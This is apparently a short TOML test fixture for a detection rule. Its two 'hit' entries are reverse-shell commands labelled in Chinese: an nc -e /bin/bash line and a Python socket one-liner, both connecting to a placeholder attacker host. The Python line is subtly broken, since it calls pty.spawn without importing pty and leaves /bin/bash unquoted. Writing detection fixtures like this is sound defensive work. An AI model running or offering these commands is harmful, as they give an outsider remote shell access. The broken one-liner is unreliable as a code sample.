examples = []
[[hit]]
command = "nc -e /bin/bash <hacker host> <port>"
description = "nc 反弹 shell"

[[hit]]
command = "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<hacker host>\",<port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(/bin/bash)'"
description = "python3 反弹 shell"

